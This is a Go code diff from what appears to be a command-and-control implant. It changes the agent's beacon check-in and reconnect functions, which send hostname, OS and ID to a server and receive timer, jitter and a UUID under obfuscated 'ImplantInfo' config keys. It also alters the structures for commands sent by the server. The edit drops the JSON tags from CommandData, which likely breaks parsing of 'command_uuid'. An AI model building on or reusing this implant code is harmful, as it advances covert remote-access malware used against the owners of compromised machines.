@@ -219,17 +219,13 @@ type ConnectionResponseData struct {
 
 // Returns: timer, id, jitter, error
 // Updates global currentID, currentTimer, currentJitter on success.
-func HTTPConnection(address string) (int, string, int, error) {
+func HTTPConnection(address string) (float64, string, float64, error) {
 	logger.Log("Starting httpConnection.")
 	hostname, errHost := getHostname()
 	if errHost != nil {
 		logger.Warn("Failed to get hostname: " + errHost.Error() + ". Using 'unknown_hostname'.")
 		hostname = "unknown_hostname"
 	}
-
-	// C++ getIPAddresses() is called but its result isn't directly in requestData.
-	// It might be logged or used elsewhere in the original full application.
-	// getIPAddresses() // Call if needed for logging or other side effects.
 
 	connectURL := GenerateConnectionURL()
 	logger.Log("Connection URL: " + connectURL)
@@ -278,31 +274,31 @@ func HTTPConnection(address string) (int, string, int, error) {
 		return -1, "", -1, fmt.Errorf("failed to parse JSON response from %s: %w. Body: %s", connectURL, err, responseBody)
 	}
 
-	timerVal := int(parsedResponse[config.Obfuscation.Generic.ImplantInfo.Timer].(float64))
-	jitterVal := int(parsedResponse[config.Obfuscation.Generic.ImplantInfo.Jitter].(float64))
-	idVal := parsedResponse[config.Obfuscation.Generic.ImplantInfo.UUID].(string)
+	timerVal := float64(parsedResponse[config.Obfuscation.Generic.ImplantInfo.Timer].(float64))
+	jitterVal := float64(parsedResponse[config.Obfuscation.Generic.ImplantInfo.Jitter].(float64))
+	idVal := string(parsedResponse[config.Obfuscation.Generic.ImplantInfo.UUID].(string))
 
 	if idVal == "" {
 		logger.Error("Received empty 'uuid' in httpConnection response from " + connectURL)
 		return -1, "", -1, fmt.Errorf("empty 'uuid' in response from %s", connectURL)
 	}
 
-	logger.Log(fmt.Sprintf("Parsed connection parameters from %s: timer=%d, uuid=%s, jitter=%d", connectURL, timerVal, idVal, jitterVal))
+	logger.Log(fmt.Sprintf("Parsed connection parameters from %s: timer=%f, uuid=%s, jitter=%f", connectURL, timerVal, idVal, jitterVal))
 	return timerVal, idVal, jitterVal, nil
 }
 
 type ReconnectRequestData struct {
-	Name    string `json:"name"`
-	OS      string `json:"os"`
-	Address string `json:"address"`
-	ID      string `json:"id"`
-	Timer   int    `json:"timer"`
-	Jitter  int    `json:"jitter"`
+	Name    string  `json:"name"`
+	OS      string  `json:"os"`
+	Address string  `json:"address"`
+	ID      string  `json:"id"`
+	Timer   float64 `json:"timer"`
+	Jitter  float64 `json:"jitter"`
 }
 
 // HTTPReconnect connects to the server to update the agent's connection parameters.
 // Returns: statusCode, responseBody, error
-func HTTPReconnect(address string, userID string, jitterVal int, timerVal int) (int, string, error) {
+func HTTPReconnect(address string, userID string, jitterVal float64, timerVal float64) (int, string, error) {
 	// 'address' param from C++ is unused for URL generation, generateReconnectURL() provides it.
 	logger.Log("Starting httpReconnect for user_id: " + userID)
 	hostname, errHost := getHostname()
@@ -319,8 +315,8 @@ func HTTPReconnect(address string, userID string, jitterVal int, timerVal int) (
 		OS:      config.OsIdentifier,
 		Address: "",
 		ID:      config.ID,
-		Timer:   config.Timer,
-		Jitter:  config.Jitter,
+		Timer:   float64(config.Timer),
+		Jitter:  float64(config.Jitter),
 	}
 
 	jsonDataBytes, err := json.Marshal(requestPayload)
@@ -346,15 +342,15 @@ func HTTPReconnect(address string, userID string, jitterVal int, timerVal int) (
 	return responseCode, responseBody, nil
 }
 
-type CommandData struct { // Generic command structure from server
-	Command     string          `json:"command"`
-	CommandUUID string          `json:"command_uuid"`
-	Data        json.RawMessage `json:"data"` // Use RawMessage to delay parsing of 'data'
+type CommandData struct {
+	Command     string
+	CommandUUID string
+	Data        json.RawMessage
 }
 
 type UpdateCommandPayload struct {
-	Timer  int `json:"timer"`
-	Jitter int `json:"jitter"`
+	Timer  float64 `json:"timer"`
+	Jitter float64 `json:"jitter"`
 }
 
 type ServerResponseWithCommands struct {
